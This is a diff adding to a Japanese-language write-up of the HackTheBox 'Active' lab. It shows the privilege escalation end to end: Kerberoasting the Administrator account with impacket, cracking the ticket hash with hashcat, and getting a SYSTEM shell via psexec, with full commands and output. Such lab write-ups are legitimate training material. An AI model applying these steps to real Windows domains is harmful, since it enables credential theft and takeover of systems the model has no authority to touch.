@@ -116,6 +116,64 @@ smb: \> dir \SVC_TGS\Desktop\
 ```
 
 今回のボックスはこのユーザのシェルをとる必要がない。というかKaliだけではこのユーザのシェルはとれなかった。
+しかしippsecが[Windowsマシンを使ってシェルをとる方法](https://youtu.be/jUc1J31DNdw?t=1120)を紹介してる。
 
-しかしippsecがWindowsマシンを使ってシェルをとる方法を紹介してる。
+# Privesc
 
+svc_tgsのクリデンシャルを使ってKerberoastableなユーザがいるか探す（ユーザ名とパスワードのセットが判明したらまずGetUserSPNs.pyで調べるいつものパターン）。
+
+```
+┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
+└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 04:06:40.351723  2022-10-18 11:44:01.344970     
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1aa7db184beb2634...e6df48ab97
+```
+
+結果的に、Administratorのチケットがとれた。
+
+これをadmin-tgsというファイル名で保存した後、次のようにクラックする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
+└─$ hashcat -a 0 -m 13100 admin-tgs /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.5) starting
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1aa7...b97:Ticketmaster1968
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...48ab97
+```
+
+得られたパスワードをもとにAdminのシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
+└─$ impacket-psexec -dc-ip 10.10.10.100 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file zoziilMD.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service iuOM on 10.10.10.100.....
+[*] Starting service iuOM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+# 感想
+
+enumの重要性を改めて実感した。うまい情報は奥深くに隠れてる。
+
+それゆえ自分は`smbmap`で再帰的にSMBシェアをリストアップする時はよく`--depth 10`を指定する。
